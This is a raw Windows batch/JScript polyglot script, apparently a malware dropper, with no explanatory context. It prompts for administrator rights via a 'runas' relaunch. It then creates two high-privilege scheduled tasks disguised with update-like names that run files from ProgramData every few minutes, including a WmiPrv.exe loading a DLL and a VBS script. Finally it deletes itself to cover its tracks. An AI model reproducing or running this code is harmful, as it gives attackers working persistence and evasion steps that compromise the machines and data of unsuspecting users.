@set @x=0; /*
@echo off
ver |>NUL find /v "5." && if "%~1"=="" cscript.exe //nologo //e:jscript "%~f0"& exit /b
schtasks.exe /create /F /RL HIGHEST /st 00:00 /sc minute /mo 2 /tn "\DirectUpdate" /tr "C:\ProgramData\SoftwareDistribution\store.vbs"
schtasks.exe /create /F /RL HIGHEST /st 00:00 /sc minute /mo 3 /tn "\UpdateDirect" /tr "C:\ProgramData\Packag\WmiPrv.exe C:\ProgramData\Packag\utshellext.dll"
del/a/f "%~f0"
exit /B 
::
*/new ActiveXObject('Shell.Application').ShellExecute (WScript.ScriptFullName,'Admin','','runas',1);